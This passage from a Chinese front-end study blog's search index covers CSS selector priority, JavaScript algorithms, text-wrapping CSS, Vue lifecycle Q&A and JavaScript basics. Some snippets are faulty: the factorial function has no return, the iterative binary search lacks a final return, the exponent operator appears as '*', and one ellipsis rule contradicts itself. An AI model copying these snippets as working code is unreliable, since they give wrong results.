w&amp;&amp;2===w.WebSocket.CLOSING))&#123;w.location.replace("http://browsehappy.osfipin.com/");&#125;&#125;(window)); CSS 样式优先级就近原则，内联样式 &gt; ID 选择器 &gt; 类选择器 = 属性选择器 = 伪类选择器 &gt; 标签选择器 = 伪元素选择器]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>Review</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 算法]]></title>
    <url>%2F2019%2F03%2F24%2FJS%2FJavaScript-%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[斐波拉契数列递归: 有边界条件，防止无限递归; 函数自身调用 1234function Fibonacci(n) &#123; if (n===0 || n===1) return n return Fibonacci(n-1) + Fibonacci(n-2)&#125; 阶乘 1234function Factorial(n) &#123; if (n===0 || n===1) return 1 Factorial(n-1) * n&#125; 快速排序 Quicksort快速排序的思想很简单，整个排序过程只需要三步：（1）在数据集之中，选择一个元素作为”基准”（pivot）。（2）所有小于”基准”的元素，都移到”基准”的左边；所有大于”基准”的元素，都移到”基准”的右边。（3）对”基准”左边和右边的两个子集，不断重复第一步和第二步，直到所有子集只剩下一个元素为止。 12345678910111213141516function quickSort(arr) &#123; if (arr.length &lt;= 1) &#123; return arr &#125; var pivotIndex = Math.floor(arr.length / 2) var pivot = arr.splice(pivotIndex, 1)[0] var left = [], right = [] for (var i = 0; i &lt; arr.length; i++) &#123; if(arr[i] &lt; pivot) &#123; left.push(arr[i]) &#125; else &#123; right.push(arr[i]) &#125; &#125; return quickSort(left).concat(pivot, quickSort(right))&#125; 二分法查找二分法查找，也称折半查找，是一种在有序数组中查找特定元素的搜索算法。查找过程可以分为以下步骤：（1）从有序数组的中间的元素开始搜索，如果该元素正好是目标元素（即要查找的元素），则搜索过程结束，否则进行下一步。（2）如果目标元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半区域查找，然后重复第一步的操作。（3）如果某一步数组为空，则表示找不到目标元素。 123456789101112131415161718192021222324252627282930313233// 递归算法// 二分查找法在算法家族大类中属于 分治法，分治法基本都可以用递归来实现的，二分查找法的递归JS实现如下：function binarySearch(arr, key, low, high) &#123; var low = low || 0, high = high || arr.length - 1 if (low &gt; high) &#123; return - 1 &#125; var mid = Math.floor((low + high) / 2) if (arr[mid] === key) &#123; return mid &#125; else if (key&gt; arr[mid]) &#123; return binarySearch(arr, key, mid+1, high) &#125; else &#123; return binarySearch(arr, key, low, mid-1) &#125;&#125;// 非递归算法// 不过所有的递归都可以自行定义stack来解递归，所以二分查找法也可以不用递归实现，而且它的非递归实现甚至可以不用栈，因为二分的递归其实是尾递归，它不关心递归前的所有信息。function binarySearch(arr, key) &#123; var low = 0, high = arr.length - 1 while(low &lt;= high) &#123; var mid = Math.floor((low + high) / 2) if (key === arr[mid]) &#123; return mid &#125; else if (key &gt; arr[mid]) &#123; low = mid + 1 &#125; else if (key &lt; arr[mid]) &#123; high = mid - 1 &#125; else &#123; return -1 &#125; &#125;&#125; 重复某字符串多次 123456// 利用 数组的 join 方法function repeatStr(str, n) &#123; return new Array(n+1).join(str)&#125;repeatStr('Hi', 3) // HiHiHi]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[white-space、word-wrap、word-break]]></title>
    <url>%2F2019%2F02%2F27%2FCSS%2Fwhite-space%E3%80%81word-wrap%E3%80%81word-break%2F</url>
    <content type="text"><![CDATA[浏览器默认情况如果有一个单词很长，导致一行剩下的空间放不下，则浏览器会把这个单词挪到下一行去。但是如果新行还是放不下，则会溢出父元素 CJK指中文/日文/韩文 统一表意文字 white-space 控制空白字符的显示，同时还能控制是否自动换行normal 合并连续的空白符，换行符会被当作空白符来处理，折行。nowrap 合并连续的空白符，文本会在在同一行上继续，不折行，直到遇到 br 标签为止。pre 连续的空白符会被保留，不折行。在遇到换行符或者 br 元素时才会换行。 类似pre标签。pre-wrap 保留所有空白符、换行符，折行。pre-line 合并连续的空白符，换行符保留，折行。 word-wrap（overflow-wrap） 控制长单词或URL是否被拆分换行normal 表示在正常的单词结束处换行。break-word 如果行内没有多余的地方容纳该单词到结尾，则那些正常的不能被分割的单词会被强制分割换行。比较温柔，会先另起一行，新的行放不到再把单词断了。 word-break 控制单词如何被拆分换行normal 使用默认的断行规则。CJK文本会自动行，非CJK文本不会自动换行，有空格时，非CJK文本也会换行。break-all 对于非CJK文本，可在任意字符间断行。所有单词碰到边界一律拆分换行。比较暴力，不会去新起一行，如果放不下，则会强制把单词折断。将非CJK内容作为CJK处理。keep-all 对于CJK文本不断行，非CJK 文本表现同 normal。 可以理解为只有空格可以触发自动换行。将CJK内容当成非CJK处理 单行文本的溢出显示省略号 123456.box&#123; width: 100px; white-space: nowrap; text-overflow: ellipsis; overflow: hidden;&#125; 多行文本溢出显示省略号 广泛使用但文字未超出行也会出现省略号 12345678910111213141516.box&#123; width: 100px; position: relative; overflow: hidden;&#125;.box::after&#123; position: absolute; content: '...'; right: 0; bottom: 0; background:-webkit-linear-gradient(left,transparent,#fff 55%); background:-o-linear-gradient(right,transparent,#fff 55%); background:-moz-linear-gradient(right,transparent,#fff 55%); background:linear-gradient(to right,transparent,#fff 55%);&#125; 多行文本溢出显示省略号 仅适用webkit内核 123456789.box&#123; width: 100px; display: -webkit-box; // 将对象作为弹性伸缩盒子模型显示 -webkit-box-orient: vertical; // 设置或检索伸缩盒对象的子元素的排列方式 -webkit-line-clamp: 3; // 显示的文本的行数 white-space: nowrap; text-overflow: ellipsis; overflow: hidden;&#125;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 vue]]></title>
    <url>%2F2019%2F02%2F26%2FVue%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-vue%2F</url>
    <content type="text"><![CDATA[谈谈你对MVVM开发模式的理解MVVM分为Model、View、ViewModel三者。Model：代表数据模型，数据和业务逻辑都在Model层中定义；View：代表UI视图，负责数据的展示；ViewModel：负责监听Model中数据的改变并且控制视图的更新，处理用户交互操作；Model和View并无直接关联，而是通过ViewModel来进行联系的，Model和ViewModel之间有着双向数据绑定的联系。因此当Model中的数据改变时会触发View层的刷新，View中由于用户交互操作而改变的数据也会在Model中同步。这种模式实现了Model和View的数据自动同步，因此开发者只需要专注对数据的维护操作即可，而不需要自己操作dom。 简单描述每个周期具体适合哪些场景生命周期：Vue 实例从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、卸载等一系列过程，我们称这是 Vue 的生命周期，各个阶段有相对应的事件钩子 beforeCreate 实例初始化之后，this指向创建的实例，数据观测（data observer）和event/watcher配置尚未完成，不能访问到data、computed、watch、methods上的方法和数据。 $el和数据对象data都为undefined。 常用于初始化非响应式变量，loading事件 created 实例创建完成，完成数据观测(data observer)，属性和方法的运算， watch/event 事件回调。可访问data、computed、watch、methods上的方法和数据。 还未挂载到DOM，不能访问到$el属性，$ref属性内容为空数组。 数据对象data有了，$el还没有。 常用于简单的ajax请求，获取初始化数据对实例进行初始化预处理，结束loading事件 beforeMount 在挂载开始之前被调用，beforeMount之前，会找到对应的template，并编译成render函数。 vue实例的$el和data都初始化了，但还是挂载之前为虚拟的dom节点，data.message还未替换。mounted 实例挂载到DOM上，此时可以通过DOM API获取到DOM节点，$ref属性可以访问，在这个阶段改变data上的值，相关的computed属性可以立刻更新 。vue实例挂载完成，data.message成功渲染。 常用于获取VNode信息和操作，ajax请求beforeupdate 响应式数据更新时调用，发生在虚拟DOM打补丁之前。 适合在更新之前访问现有的DOM，比如手动移除已添加的事件监听器updated 虚拟 DOM 重新渲染和打补丁之后调用，组件DOM已经更新，可执行依赖于DOM的操作。 避免在这个钩子函数中操作数据，可能陷入死循环beforeDestroy 实例销毁之前调用。这一步，实例仍然完全可用，this仍能获取到实例。 常用于销毁定时器、解绑全局事件、销毁插件对象等操作destroyed 实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁 –nextTick : 更新数据后立即操作dom created阶段的ajax请求与mounted请求的区别：前者页面视图未出现，如果请求信息过多，页面会长时间处于白屏状态mounted 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 vm.$nextTick 封装 vue 组件的过程使用Vue.extend方法创建一个组件，然后使用Vue.component方法注册组件。子组件需要数据，可以在props中接受定义。而子组件修改好数据后，想把数据传递给父组件。可以采用emit方法。 对Vue.js的template编译的理解答：简而言之，就是先转化成AST树，再得到的render函数返回VNode（Vue的虚拟DOM节点）详情步骤：首先，通过compile编译器把template编译成AST语法树（abstract syntax tree 即 源代码的抽象语法结构的树状表现形式），compile是createCompiler的返回值，createCompiler是用以创建编译器的。另外compile还负责合并option。然后，AST会经过generate（将AST语法树转化成render funtion字符串的过程）得到render函数，render的返回值是VNode，VNode是Vue的虚拟DOM节点，里面有（标签名、子节点、文本等等） Vue的双向数据绑定原理是什么vue.js 是采用数据劫持结合发布者-订阅者模式的方式，通过 Object.defineProperty() 来劫持各个属性的 setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。具体步骤：第一步：需要 observe 的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter 和 getter。这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化第二步：compile 解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图第三步：Watcher 订阅者是 Observer 和 Compile 之间通信的桥梁，主要做的事情是:1、在自身实例化时往属性订阅器(dep)里面添加自己2、自身必须有一个 update() 方法3、待属性变动 dep.notice() 通知时，能调用自身的 update() 方法，并触发 Compile 中绑定的回调，则功成身退。第四步：MVVM作为数据绑定的入口，整合 Observer、Compile 和 Watcher 三者，通过 Observer 来监听自己的 model 数据变化，通过 Compile 来解析编译模板指令，最终利用 Watcher 搭起 Observer 和 Compile 之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。 简述Vue的响应式原理https://mp.weixin.qq.com/s/gVshLnybS0JG88z1DfoYGg 98道经典Vue面试题总结（长期更新）https://segmentfault.com/a/1190000016351284 vue 面试试题https://www.kancloud.cn/hanxuming/vue-iq/728305]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Review</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript基础]]></title>
    <url>%2F2019%2F02%2F26%2FJS%2FJavaScript%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[概述 什么是 JavaScript 语言？JavaScript (JS for short) is the programming language that enables web pages to respond to user interaction beyond the basic level. It was created in 1995 by Brendan Eich, and is today one of the most famous and used programming languages. JavaScript 是一种轻量级的脚本语言。所谓“脚本语言”（script language），指的是它不具备开发操作系统的能力，而是只用来编写控制其他大型应用程序（比如浏览器）的“脚本”。 JavaScript 也是一种嵌入式（embedded）语言。它本身提供的核心语法不算很多，只能用来做一些数学和逻辑运算。JavaScript 本身不提供任何与 I/O（输入/输出）相关的 API，都要靠宿主环境（host）提供，所以 JavaScript 只合适嵌入更大型的应用程序环境，去调用宿主环境提供的底层 API。 编译型语言 vs 解释型语言编译型语言，首先是将源代码编译compile生成机器指令，再由机器运行机器码 (二进制)。执行效率高。如C、C++解释型语言，源代码先翻译成中间代码，再由解释器对中间代码进行解释运行。每次运行的时候都要逐行解释一遍，有良好的平台兼容性。如JavaScript、Python、PHP 动态类型语言 vs 静态类型语言动态类型语言，是指数据类型的检查是在运行时做的。用动态类型语言编程时，不用给变量指定数据类型，该语言会在你第一次赋值给变量时，在内部记录数据类型。静态类型语言，是指数据类型的检查是在运行前（如编译阶段）做的。 JavaScript语言的历史 1995年5月，Brendan Eich只用了10天，就设计完成了这种语言的第一版。基本语法：借鉴C语言和Java语言。数据结构：借鉴Java语言，包括将值分成原始值和对象两大类。函数的用法：借鉴Scheme语言和Awk语言，将函数当作第一等公民，并引入闭包。原型继承模型：借鉴Self语言（Smalltalk的一种变种）。正则表达式：借鉴Perl语言。字符串和数组处理：借鉴Python语言。 1996年，样式表标准CSS第一版发布。1997年，DHTML（Dynamic HTML，动态HTML）发布，允许动态改变网页内容。这标志着DOM模式（Document Object Model，文档对象模型）正式应用。 1997年7月，ECMAScript 1.0。1998年6月，ECMAScript 2.0。格式修正，以使得其形式与ISO/IEC16262国际标准一致。1999年12月，ECMAScript 3.0。强大的正则表达式，更好的文字链处理，新的控制指令，异常处理，错误定义更加明确，数输出的格式化及其它改变。 2001年，微软公司时隔5年之后，发布了IE浏览器的下一个版本Internet Explorer 6。2002年，Mozilla项目发布了它的浏览器的第一版，后来起名为Firefox。2003年，苹果公司发布了Safari浏览器的第一版。2005年，Ajax方法（Asynchronous JavaScript and XML）正式诞生。Google Maps项目大量采用该方法。促成了Web 2.0时代的来临。2005年，Apache基金会发布了CouchDB数据库。基于JSON格式的数据库，可以用JavaScript函数定义视图和索引，标识着NoSQL类型的数据库诞生。2006年，jQuery函数库诞生，作者为John Resig。2006年，微软公司发布IE 7，标志重新开始启动浏览器的开发。2008年，V8编译器诞生。这是Google公司为Chrome浏览器而开发的，它的特点是让JavaScript的运行变得非常快。V8是开源的，拓展了JavaScript的应用领域。2009年，Node.js项目诞生，创始人为Ryan Dahl，它标志着JavaScript可以用于服务器端编程，从此网站的前端和后端可以使用同一种语言开发。 2009年12月，ECMAScript 5.0。2011年6月，ECMAscript 5.1，并且成为ISO国际标准（ISO/IEC 16262:2011）。到了2012年底，所有主要浏览器都支持ECMAScript 5.1版的全部功能。 2012年，SPA单页面应用程序框架开始崛起，AngularJS项目和Ember项目都发布了1.0版本。2012年，微软发布TypeScript语言。该语言被设计成JavaScript的超集，这意味着所有JavaScipt程序，都可以不经修改地在TypeScript中运行。2013年5月，Facebook发布UI框架库React，引入了新的JSX语法，使得UI层可以用组件开发。2015年3月，Facebook公司发布了React Native项目，将React框架移植到了手机端，可以用来开发手机原生App。2015年4月，Angular框架宣布，2.0版将基于微软公司的TypeScript语言开发，这等于为JavaScript语言引入了强类型。 2015年6月17日，ECMAScript 6，更名为 ECMAScript 2015。新增let、const、class、modules、arrow functions、rest argument、binary data、promises等等。这个标准从提出到批准，历时10年，而JavaScript语言从诞生至今也已经20年了。2016年06月，ECMAScript 2016。完善ES6规范，两个新的功能：求幂运算符（*）和array.prototype.includes方法。2017年06月：ECMAScript 2017。增加新的功能，如并发、原子操作、Object.values/Object.entries、字符串填充、promises、await/asyn等等。2017年11月，所有主流浏览器全部支持 WebAssembly，这意味着任何语言都可以编译成 JavaScript，在浏览器运行。 ES6、ES7、ES8、ES9、ES10新特性一览 ES6新特性（2015） 2015年6月17日let、constclass 类modules 模块化(import、export)arrow functions 箭头函数函数参数默认值模板字符串 ${}解构赋值。 通过解构赋值可以方便的交换两个变量的值。 如 var foo = [“one”, “two”, “three”, “four”]; var [first, , , last] = foo;spread operator 延展操作符。 构造对象时,进行克隆或者属性拷贝，如let objClone = { …obj } 浅拷贝对象属性简写Promise ES7新特性（2016） 2016年06月array.prototype.includes() 方法，用来判断一个数组是否包含一个指定的值，包含则返回true，否则返回false 指数运算符，它与 a b === Math.pow(a, b) ES8新特性（2017） 2017年06月async/await 异步迭代器Object.values(obj), 返回obj自身属性的值，不包括继承的值Object.entries(obj), 返回obj对象自身可枚举属性的键值对的数组String padding: String.padStart(targetLength,padString]) 和padEnd()，填充字符串达到当前长度Object.getOwnPropertyDescriptors(obj), 获取一个对象的所有自身属性的描述符,如果没有任何自身属性，则返回空对象ShareArrayBuffer 对象, 表示一个通用的、固定长度的原始二进制数据缓冲区，类似于 ArrayBuffer 对象，但 SharedArrayBuffer 不能被分离Atomics对象，对 SharedArrayBuffer 对象进行原子操作函数参数列表结尾允许逗号, 主要作用是方便使用git进行多人协作开发时修改同一个函数减少不必要的行变更。 ES9新特性（2018） 2018年6月异步迭代, 在async/await的某些时刻，你可能尝试在同步循环中调用异步函数Promise.finally()Rest/Spread 属性正则表达式命名捕获组（Regular Expression Named Capture Groups）正则表达式反向断言（lookbehind）正则表达式dotAll模式正则表达式 Unicode 转义非转义序列的模板字符串 ES10新特性（2019）行分隔符（U + 2028）和段分隔符（U + 2029）符号现在允许在字符串文字中，与JSON匹配更加友好的 JSON.stringifyArray.prototype.flat() 和flatMap()方法， 数组降维和去除数组的空项String.prototype.trimStart() 和 trimEnd()方法，分别去除字符串首尾空白字符Object.fromEntries(), 返回一个给定对象自身可枚举属性的键值对数组, 是 Object.entries() 的反转, 可以将 Map/Array 转化为 ObjectSymbol.prototype.descriptionString.prototype.matchAll, 返回一个包含所有匹配正则表达式及分组捕获结果的迭代器Function.prototype.toString(), 返回精确字符，包括空格和注释简化try {} catch {},修改 catch 绑定 BigInt 新的基本数据类型, 任意精度整数, 意味着变量可以定义2⁵³的数字了，不再有9007199254740992的最大限制。至此，JS共有七种基本数据类型 String、Number、Boolean、Null、Undefined、Symbol、BigInt globalThis, 标准化全局对象，无视环境，直接获取当前的全局对象Dynamic import, 动态引入js1234element.addEventListener('click', async () =&gt; &#123; const module = await import(`./some.js`) module.clickEvent()&#125;) 基本语法 语句 和 表达式JavaScript 程序的执行单位为行（line），也就是一行一行地执行。一般情况下，每一行就是一个语句。语句（statement）是为了完成某种任务而进行的操作，以分号结尾，一个分号就表示一个语句结束。var a = 2 + 3;表达式（expression），指一个为了得到返回值的计算式，不需要分号结尾，一旦在表达式后面添加分号，则引擎就将其视为语句。 2 + 3 变量变量是对“值”的具名引用。变量就是为“值”起名，然后引用这个名字，就等同于引用这个值。变量的名字就是变量名。 注意，JavaScript 的变量名区分大小写，A和a是两个不同的变量。 变量提升JavaScript 引擎的工作方式是，先解析代码，获取所有被声明的变量，然后再一行一行地运行。这造成的结果，就是所有的变量的声明语句，都会被提升到代码的头部，这就叫做变量提升（hoisting）。 12345678// hoistingconsole.log(a);var a = 1;// 真正运行的是下面的代码var a;console.log(a); // undefineda = 1; 标识符标识符（identifier）指的是用来识别各种值的合法名称。最常见的标识符就是变量名，以及后面要提到的函数名。JavaScript 语言的标识符对大小写敏感，所以a和A是两个不同的标识符。 规则：第一个字符，可以是任意 Unicode 字母（包括英文字母和其他语言的字母），以及美元符号（$）和下划线（_）。第二个字符及后面的字符，除了 Unicode 字母、美元符号和下划线，还可以用数字0-9。 中文是合法的标识符，可以用作变量名。 var 临时变量 = 1; JavaScript 有一些保留字，不能用作标识符：arguments、break、case、catch、class、const、continue、debugger、default、delete、do、else、enum、eval、export、extends、false、finally、for、function、if、implements、import、in、instanceof、interface、let、new、null、package、private、protected、public、return、static、super、switch、this、throw、true、try、typeof、var、void、while、with、yield。 循环语句while 循环，只要条件为真，就不断循环执行代码块123while (true) &#123; console.log('Hello, world');&#125; for 循环, 可以指定循环的起点、终点和终止条件, for语句的三个部分（initialize、test、increment），可以省略任何一个，也可以全部省略123456789101112var x = 3;for (var i = 0; i &lt; x; i++) &#123; console.log(i);&#125;// 所有for循环，都可以改写成while循环var x = 3;var i = 0;while (i &lt; x) &#123; console.log(i); i++;&#125; do…while 循环，与while循环类似，唯一的区别就是先运行一次循环体，然后判断循环条件。至少运行一次，while语句后面的分号注意不要省略123456var x = 3;var i = 0;do &#123; console.log(i); i++;&#125; while(i &lt; x); break 语句和 continue 语句，都具有跳转作用，可以让代码不按既有的顺序执行break语句用于跳出代码块或循环。for循环也可以使用break语句跳出循环。continue语句用于立即终止本轮循环，返回循环结构的头部，开始下一轮循环。 标签 label，语句的前面有标签，相当于定位符，用于跳转到程序的任意位置。标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。通常与break语句和continue语句配合使用，跳出特定的循环。1234567891011121314top: for (var i = 0; i &lt; 3; i++)&#123; for (var j = 0; j &lt; 3; j++)&#123; if (i === 1 &amp;&amp; j === 1) break top; console.log('i=' + i + ', j=' + j); &#125; &#125;// i=0, j=0// i=0, j=1// i=0, j=2// i=1, j=0// 上面代码为一个双重循环区块，break命令后面加上了top标签（注意，top不用加引号），满足条件时，直接跳出双层循环。如果break语句后面不使用标签，则只能跳出内层循环，进入下一次的外层循环。 数据类型七种数据类型共有七种: 数值 number、字符串 string、布尔值 boolean、undefined、uull、symbol 和 对象 object基本类型: number、string、boolean、undefined、uull、symbol。 按值访问，可以操作保存在变量中的实际的值，任何方法都无法改变一个基本类型的值，变量存放在栈区。引用类型, Object、Array和Function。 按引用访问，值是同时保存在栈内存和堆内存中的对象，比较是引用的比较即堆内存中的地址是否相同 typeof 运算符JavaScript 有三种方法，可以确定一个值到底是什么类型。typeof运算符、instanceof运算符、Object.prototype.toString方法。 12345678910111213141516171819202122232425// 数值、字符串、布尔值分别返回number、string、booleantypeof 123 // "number"typeof '123' // "string"typeof false // "boolean"// undefined返回undefinedtypeof undefined // "undefined" 利用这一点，typeof可以用来检查一个没有声明的变量，而不报错 if (typeof v === "undefined") &#123;&#125;// 对象返回objecttypeof window // "object"typeof &#123;&#125; // "object"typeof [] // "object" 这表示在 JavaScript 内部，数组本质上只是一种特殊的对象// instanceof运算符可以区分数组和对象var o = &#123;&#125;, a = [];o instanceof Array // falsea instanceof Array // true// null返回objecttypeof null // "object" 由于历史原因造成的,第一版没有null// 函数返回function。function f() &#123;&#125;typeof f // "function" null, undefined 和布尔值null是一个表示“空”的对象，表示空值，即该处的值现在为空，转为数值时为0undefined是一个表示”未定义”的原始值，转为数值时为NaN12Number(undefined) // NaN5 + undefined // NaN 布尔值代表“真”和“假”两个状态， true 和 falsefalse: undefined、null、false、0、NaN、””或’’（空字符串）true: 除上面六个值外。 注意，空数组（[]）和空对象（{}）对应的布尔值都是true123if ([]) &#123; console.log('ok') // ok&#125; 以下运算符会返回布尔值: 前置逻辑运算符 (! Not)、 相等运算符（===，!==，==，!=）、 比较运算符（&gt;，&gt;=，&lt;，&lt;=） 数值JavaScript内部，所有数字都是以64位浮点数形式储存，即使整数也是如此，就是说，JS语言的底层根本没有整数，所有数字都是小数（64位浮点数）。。1234561 === 1.0 // true 1与1.0是相同的，是同一个数。// 由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心0.1 + 0.2 === 0.300000000000000040.2-0.1 === 0.10.3-0.2 === 0.09999999999999998 JavaScript 浮点数的64个二进制位第1位：符号位，0表示正数，1表示负数第2位到第12位（共11位）：指数部分，大小范围就是0 - 2047(2的11次方减1)第13位到第64位（共52位）：小数部分（即有效数字） 数值精度:最多只能到53个二进制位，这意味着，绝对值小于2的53次方的整数，即-253到253，都可以精确表示。大于2的53次方的数值，都无法保持精度。由于2的53次方是一个16位的十进制数值，所以简单的法则就是，JavaScript 对15位的十进制数都可以精确处理。 数值范围:JavaScript 能够表示的数值范围为(2^1024,2^-1023)，超出这个范围的数无法表示。如果一个数大于等于2的1024次方，那么就会发生“正向溢出”，即 JavaScript 无法表示这么大的数，这时就会返回Infinity如果一个数小于等于2的-1075次方（指数部分最小值-1023，再加上小数部分的52位），那么就会发生为“负向溢出”，这时会直接返回0。 JavaScript 提供Number对象的MAX_VALUE和MIN_VALUE属性，返回可以表示的具体的最大值和最小值。Number.MAX_VALUE // 1.7976931348623157e+308Number.MIN_VALUE // 5e-324 正零和负零:JavaScript 的64位浮点数之中，有一个二进制位是符号位。这意味着，任何一个数都有一个对应的负值，就连0也不例外。JavaScript 内部实际上存在2个0：一个是+0，一个是-0，区别就是64位浮点数表示法的符号位不同。它们是等价的。几乎所有场合，正零和负零都会被当作正常的0。唯一有区别的场合是，+0或-0当作分母，返回的值是不相等的。 1234567891011121314151617181920212223242526272829303132333435360 === +0 === -0 // true+0 // 0-0 // 0(-0).toString() // '0'// 唯一有区别的场合是，+0或-0当作分母，返回的值是不相等的。因为除以正零得到+Infinity，除以负零得到-Infinity，这两者是不相等的(1 / +0) === (1 / -0) // false ``` * NaN:NaN是 JavaScript 的特殊值，表示“非数字”（Not a Number）```JavaScript// 主要出现在将字符串解析成数字出错的场合5 - 'x' // NaN// 一些数学函数的运算结果会出现NaNMath.acos(2) // NaN // 0除以0也会得到NaN。0 / 0 // NaN// 需要注意的是，NaN不是独立的数据类型，而是一个特殊数值，它的数据类型依然属于Number，使用typeof运算符可以看得很清楚。typeof NaN // 'number'// NaN不等于任何值，包括它本身。NaN === NaN // false// 数组的indexOf方法内部使用的是严格相等运算符，所以该方法对NaN不成立。[NaN].indexOf(NaN) // -1// NaN在布尔运算时被当作false。Boolean(NaN) // false// NaN与任何数（包括它自己）的运算，得到的都是NaN。NaN + 666 // NaN&#125; Infinity:Infinity表示“无穷”，用来表示两种场景。一种是一个正的数值太大，或一个负的数值太小，无法表示；另一种是非0数值除以0，得到Infinity。 12345678910111213141516171819202122232425262728293031323334353637383940414243Math.pow(2, 1024) // Infinity0 / 0 // NaN1 / 0 // Infinity// Infinity有正负之分，Infinity表示正的无穷，-Infinity表示负的无穷。Infinity === -Infinity // false1 / -0 // -Infinity-1 / -0 // Infinity// Infinity大于一切数值（除了NaN），-Infinity小于一切数值（除了NaN）。Infinity &gt; 1000 // true-Infinity &lt; -1000 // true// Infinity与NaN比较，总是返回false。Infinity &gt; NaN // false// Infinity的四则运算，符合无穷的数学计算规则。5 * Infinity // Infinity5 - Infinity // -InfinityInfinity / 5 // Infinity5 / Infinity // 0// 0乘以Infinity，返回NaN；0除以Infinity，返回0；Infinity除以0，返回Infinity。0 * Infinity // NaN0 / Infinity // 0Infinity / 0 // Infinity// Infinity加上或乘以Infinity，返回的还是Infinity。Infinity + Infinity // InfinityInfinity * Infinity // Infinity// Infinity减去或除以Infinity，得到NaN。Infinity - Infinity // NaNInfinity / Infinity // NaN// Infinity与null计算时，null会转成0，等同于与0的计算。null * Infinity // NaNnull / Infinity // 0Infinity / null // Infinity// Infinity与undefined计算，返回的都是NaN。Infinity / undefined // NaN 与数值相关的全局方法parseInt() 用于将字符串转为整数, 返回值只有两种可能，要么是一个十进制整数，要么是NaN。 123456789101112131415161718192021222324252627282930// 基本用法parseInt('123') // 123parseInt(' 81') // 81 如果字符串头部有空格，空格会被自动去除。parseInt(1.23) // 1 如果parseInt的参数不是字符串，则会先转为字符串再转换。parseInt('15px') // 15 字符串转为整数的时候，是一个个字符依次转换，如果遇到不能转为数字的字符，就不再进行下去，返回已经转好的部分。parseInt('abc') // NaN 如果字符串的第一个字符不能转化为数字（后面跟着数字的正负号除外），返回NaN。parseInt('0x10') // 16 如果字符串以0x或0X开头，parseInt会将其按照十六进制数解析。parseInt('011') // 11 如果字符串以0开头，将其按照10进制解析。// 对于那些会自动转为科学计数法的数字，parseInt会将科学计数法的表示方法视为字符串，因此导致一些奇怪的结果。parseInt(0.0000008) // 8parseInt('8e-7') // 8// 进制转换// parseInt方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。默认第二个参数为10，即默认是十进制转十进制parseInt('1000', 2) // 8 二进制、八进制的1000，分别等于十进制的8、和512parseInt('1000', 8) // 512// 如果第二个参数不是数值，会被自动转为一个整数。这个整数只有在2到36之间，才能得到有意义的结果，超出这个范围，则返回NaN。如果第二个参数是0、undefined和null，则直接忽略。parseInt('10', 37) // NaNparseInt('10', 0) // 10parseInt('10', null) // 10parseInt('10', undefined) // 10// 如果字符串包含对于指定进制无意义的字符，则从最高位开始，只返回可以转换的数值。如果最高位无法转换，则直接返回NaN。parseInt('1546', 2) // 1parseInt('546', 2) // NaN parseFloat()： 用于将一个字符串转为浮点数1234567891011121314151617181920212223242526272829parseFloat('3.14') // 3.14// 如果字符串符合科学计数法，则会进行相应的转换parseFloat('314e-2') // 3.14// 如果字符串包含不能转为浮点数的字符，则不再进行往后转换，返回已经转好的部分parseFloat('3.14more non-digit characters') // 3.14// parseFloat方法会自动过滤字符串前导的空格parseFloat('\t\v\r12.34\n ') // 12.34// 如果参数不是字符串，或者字符串的第一个字符不能转化为浮点数，则返回NaNparseFloat([]) // NaNparseFloat('FF2') // NaNparseFloat('') // NaN 尤其值得注意，parseFloat会将空字符串转为NaN// 这些特点使得parseFloat的转换结果不同于Number函数parseFloat(true) // NaNNumber(true) // 1parseFloat(null) // NaNNumber(null) // 0parseFloat('') // NaNNumber('') // 0parseFloat('123.45#') // 123.45Number('123.45#') // NaN isNaN(): 可以用来判断一个值是否为NaN123456789101112131415161718192021222324252627isNaN(NaN) // trueisNaN(123) // false// 只对数值有效，如果传入其他值，会被先转成数值isNaN('Hello') // true// 相当于isNaN(Number('Hello')) // true// 出于同样的原因，对于对象和数组，isNaN也返回trueisNaN(&#123;&#125;) // true// 等同于isNaN(Number(&#123;&#125;)) // true// 但是，对于空数组和只有一个数值成员的数组，isNaN返回false ，因为这些数组能被Number函数转成数值isNaN([]) // falseisNaN([123]) // falseisNaN(['123']) // false// 因此，使用isNaN之前，最好判断一下数据类型function myIsNaN(value) &#123; return typeof value === 'number' &amp;&amp; isNaN(value)&#125;// 判断NaN更可靠的方法是，利用NaN为唯一不等于自身的值的这个特点，进行判断function myIsNaN(value) &#123; return value !== value&#125; isFinite(): 返回一个布尔值，表示某个值是否为正常的数值12345678// 除了Infinity、-Infinity、NaN和undefined这几个值会返回false，isFinite对于其他的数值都会返回trueisFinite(Infinity) // falseisFinite(-Infinity) // falseisFinite(NaN) // falseisFinite(undefined) // falseisFinite(null) // trueisFinite(-1) // true 字符串字符串就是零个或多个排在一起的字符，放在单引号或双引号之中。 转义, 反斜杠（\）在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义符。1234567891011121314151617181920212223242526272829303132333435363738\0 ：null（\u0000）\b 